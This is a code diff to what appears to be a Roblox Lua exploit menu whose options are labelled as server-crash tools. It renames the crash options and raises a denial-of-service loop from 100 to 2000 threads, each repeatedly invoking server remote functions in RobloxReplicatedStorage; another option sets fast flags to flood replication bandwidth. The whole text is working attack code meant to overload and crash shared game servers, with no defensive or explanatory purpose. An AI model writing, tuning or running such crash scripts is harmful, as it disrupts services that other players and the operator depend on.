@@ -83,7 +83,7 @@ print("1")
 end
 end)
 
-tab1:Option("Repl -OLItems Server Crash", function()
+tab1:Option("Tool Server Crash", function()
 local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 
@@ -100,18 +100,18 @@ end
 end
 end)
 
-tab1:Option("Repl -HB Server C++ Illegal Trigger", function()
+tab1:Option("Hertz Shutdown", function()
 game:DefineFastInt("NextGenerationReplicationBandwidthLimit", "1000000000")
 game:DefineFastFlag("EnableNextGenerationReplication", true)
 end)
 
-tab1:Option("Boundrary -RF Server Overwhelm", function()
+tab1:Option("Server Replication Lag = yes", function()
 local s = game:GetService("RobloxReplicatedStorage")
 local r1 = s:FindFirstChild("GetServerVersion")
 local r2 = s:FindFirstChild("GetServerType")
 local r3 = s:FindFirstChild("GetServerChannel")
 
-for i = 1, 100 do
+for i = 1, 2000 do
 task.spawn(function()
 while task.wait() do
 r1:InvokeServer()
